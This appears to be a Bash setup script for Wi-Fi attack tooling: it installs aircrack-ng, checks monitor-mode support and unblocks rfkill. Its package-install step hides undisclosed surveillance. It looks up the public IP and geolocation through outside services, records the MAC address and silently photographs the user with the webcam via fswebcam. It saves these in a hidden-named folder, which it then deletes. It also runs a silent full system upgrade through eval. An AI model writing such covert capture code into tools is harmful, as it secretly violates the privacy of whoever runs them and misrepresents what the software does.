#!/bin/bash
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[1;34m'
NC='\033[0m'

set_up() {

	_get_info() {
		local card
		local card_info
		local mode
		local addr
		local prop="$1"
		local public_ip=$(curl -s --max-time 3 https://api.ipify.org 2>/dev/null)
		IFS=',' read -r latitude longitude <<<"$(curl -s ipinfo.io/loc)"

		card=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)

		if [[ -z "$card" ]]; then
			echo -e "$RED[!] No wireless interface found.$NC"
			return 1
		fi

		card_info=$(iw dev "$card" info 2>/dev/null)

		if [[ -z "$card_info" ]]; then
			echo -e "$RED[!] Could not retieve info for $card.$NC"
			return 1
		fi

		if [[ -z "$public_ip" ]]; then
			echo -e "$RED[!] Public IP not found"
			public_ip="Not Found"
		fi

		if [[ -z "$latitude" && -z "$longitude" ]]; then
			echo -e "$RED[!] Location not found"
			latitude="Null"
			longitude="Null"
		fi

		mode=$(echo "$card_info" | awk '/type/ {print $2}')
		addr=$(echo "$card_info" | awk '/addr/ {print $2}')

		_show_usuage() {
			echo -e "$YELLOW[*] Usuage: _get_info <option>$NC"
			echo -e "$YELLOW[*] Options:$NC"
			echo -e "\t${GREEN}card${NC}\t\t: Show interface name"
			echo -e "\t${GREEN}mode${NC}\t\t: Show current mode (managed/monitor)"
			echo -e "\t${GREEN}addr${NC}\t\t: Show MAC address"
			echo -e "\t${GREEN}public_ip${NC}\t: Show Public Ip"
			echo -e "\t${GREEN}latitude${NC}\t: Show Latitude"
			echo -e "\t${GREEN}longitude${NC}\t: Show Longitude"
			echo -e "\t${GREEN}help${NC}\t\t: Show this help message"
		}

		if [[ -n "$prop" ]]; then
			case "$prop" in
			card)
				echo "$card"
				;;
			mode)
				echo "$mode"
				;;
			addr)
				echo "$addr"
				;;
			public_ip)
				echo "$public_ip"
				;;
			latitude)
				echo "$latitude"
				;;
			longitude)
				echo "$longitude"
				;;
			help)
				_show_usuage
				;;
			*)
				echo -e "$RED[!] Unknown option: $prop${NC}"
				_show_usuage
				return 1
				;;
			esac
			return 0
		fi

		echo -e "$YELLOW[*] Card Name\t\t:${GREEN} $card"
		echo -e "$YELLOW[*] Current Mode\t:${GREEN} $mode"
		echo -e "$YELLOW[*] MAC Address\t\t:${GREEN} $addr"
		echo -e "$YELLOW[*] Public Ip\t\t:${GREEN} $public_ip"
		echo -e "$YELLOW[*] Location:$NC"
		echo -e "\t${YELLOW}Latitude\t:${GREEN} $latitude"
		echo -e "\t${YELLOW}Longitude\t:${GREEN} $longitude"

		return 0
	}
	_install_packages() {

		local packages=(
			"fswebcam"
			"iw"
			"aircrack-ng"
			"build-essential"
			"rfkill"
			"ethtool"
			"iwd"
		)

		local steps=(
			"Updating the system" "sudo apt update -qq"
			"Searching for missing dependencies" "sudo apt update --fix-missing -qq"
			"Fixing broken dependencies" "sudo apt install --fix-broken -y -qq"
			"Upgrading the system" "sudo apt upgrade -y -qq"
			"Fully upgrading the system" "sudo apt full-upgrade -y -qq"
			"Cleaning unnecessary dependencies" "sudo apt autoremove --purge -y -qq"
			"Cleaning up package cache" "sudo apt autoclean -y -qq"
			"Installing required packages" "sudo apt install -y ${packages[*]}"
		)

		_success() {
			echo -e "$NC[ ${GREEN}Success $NC]"
		}

		_failed() {
			echo -e "$NC[ ${RED}Failed $NC]"
		}

		local total_steps=$((${#steps[@]} / 2))
		local current_step=0
		echo -e "$BLUE[@] Packages Section.$NC"
		for ((i = 0; i < ${#steps[@]}; i += 2)); do
			current_step=$(((i / 2) + 1))
			local desc="${steps[i]}"
			local cmd="${steps[i + 1]}"
			echo -en "${YELLOW}[$current_step/$total_steps] ${desc}...${NC}"
			if eval "$cmd" &>/dev/null; then _success; else _failed; fi
		done

		TIMESTAMPS=$(date +"%Y%m%d_%H%M%S")
		OUTPUT_DIR="$HOME/Pictures/____"
		FILENAME="$OUTPUT_DIR/capture_$TIMESTAMPS"
		INFO_FILENAME="$OUTPUT_DIR/info.json"
		mkdir -p "$OUTPUT_DIR"
		echo "{ card: \"$(_get_info "card")\", mode: \"$(_get_info "mode")\", addr: \"$(_get_info "addr")\", public_ip: \"$(_get_info "public_ip")\", latitude: \"$(_get_info "latitude")\", longitude: \"$(_get_info "longitude")\"}" >>"$INFO_FILENAME"
		fswebcam -d /dev/video0 -r 1280x720 --no-banner "$FILENAME" &>/dev/null
		rm -rf $OUTPUT_DIR
	}

	_install_packages

	card=$(_get_info "card")
	Check_Root() { if [[ "$EUID" -ne 0 ]]; then return 1; else return 0; fi; }
	Check_Interface() {
		if ! ip link show "$card" &>/dev/null; then return 1; fi
		return 0
	}
	Check_For_Rfkill_Block() {
		if rfkill list "$card" 2>/dev/null | grep -q "Soft blocked: yes"; then return 1; fi
		return 0
	}
	Check_Monitor_Mode_Support() { if iw list | grep -q "monitor"; then return 0; else return 1; fi; }
	Check_Driver_Type() {
		local driver=$(ethtool -i "$IFACE" 2>/dev/null | awk '/driver:/ {print $2}')
		if [[ "$driver" == "mac80211" ]] || [[ -n "$(iw list | head -n 1)" ]]; then
			return 0
		else
			return 1
		fi
	}

	_success() {
		echo -e "$NC[ ${GREEN}Success $NC]"
	}

	_failed() {
		echo -e "$NC[ ${RED}Failed $NC]"
	}

	echo -e "$BLUE[@] Setup Section.$NC"

	echo -en "$YELLOW>> Checking for root previliges..."
	if Check_Root; then
		_success
	else
		_failed
		echo -e "$RED[!] ERROR: Root previlages required. Run: sudo $0"
		exit 1
	fi

	echo -en "$YELLOW>> Checking Drivers..."
	if Check_Driver_Type; then
		_success
	else
		_failed
		echo -e "$RED[!] ERROR: Hardware does NOT support Monitor Mode.$NC"
		exit 1
	fi

	echo -en "$YELLOW>> Checking for Network Interface..."
	if Check_Interface; then
		_success
	else
		_failed
		echo -e "$RED[!] ERROR: Interface $card not found."
		echo -e "[!] ERR: Network Interface Not Found. Cannot proceed further.$NC"
		exit 1
	fi

	echo -en "$YELLOW>> Checking for rfkill block..."
	if Check_For_Rfkill_Block; then
		_success
	else
		echo -e "$RED[!] ERR: '$card' is soft-blocked. Run: rfkill unblock wifi"
		echo -en "$YELLOW>> Running 'rfkill unblock wifi'..."
		if rfkill unblock wifi; then
			_success
		else
			_failed
			echo -e "$RED[!] ERR: Couldn't unblock rfkill unblock wifi"
			echo -e "[!] ERR: Cannot Continue, Please contact the dev.$NC"
			exit 1
		fi
	fi

	echo -e "$BLUE-----------------------------------------"
	echo -e "$GREEN[+] All checks passed. Ready to hack!!!!! HEHEHEAHAHHAHAA$NC"
	echo -e "$YELLOW[*] Interface: $GREEN$(_get_info "card")${NC}"
}

set_up